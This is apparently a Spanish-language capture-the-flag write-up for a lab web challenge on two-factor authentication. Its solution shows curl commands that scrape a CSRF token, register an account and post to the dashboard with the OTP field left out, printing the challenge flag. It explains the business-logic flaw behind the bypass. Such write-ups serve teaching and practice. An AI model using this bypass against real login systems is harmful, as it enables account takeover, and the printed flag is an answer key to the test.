## Descripción 
Este sitio web te pide que verifiques la identidad mediante autenticación de dos factores. Regístrate y luego analiza detenidamente las solicitudes que envía tu navegador.

Intenta usar Burp Suite para interceptar la solicitud y capturar la bandera.
Intenta modificar la solicitud, tal vez su código del lado del servidor no maneja bien las solicitudes mal formadas.
## Solución 
```
Son69-academy@webshell:~$ URL="http://xebec.cylabacademy.net:30964/"
Son69-academy@webshell:~$ CSRF=$(curl -s -c cookie.txt "$URL/" | grep "csrf_token" | grep -o 'value="[^"]*"' | cut -d'"' -f2)
Son69-academy@webshell:~$ curl -s -b cookie.txt -c cookie.txt -d "csrf_token=$CSRF&full_name=Test&username=hacker&phone_number=123&city=Test&password=hacker&submit=Register" "$URL/" > /dev/null
Son69-academy@webshell:~$ curl -s -L -b cookie.txt -d "nada=nada" "$URL/dashboard" | grep -o 'academy{.*}'
academy{#0TP_Bypvss_SuCc3$S_3c1fad56}
```
## Notas adicionales 
* El reto explota una falla en la lógica de negocio del servidor. En lugar de enviar un código OTP (One Time Password) incorrecto, se elimina por completo la variable (por ejemplo, el campo `otp`) de la petición HTTP POST
## Referencias
* Gemini 
* https://webshell.cylabacademy.org/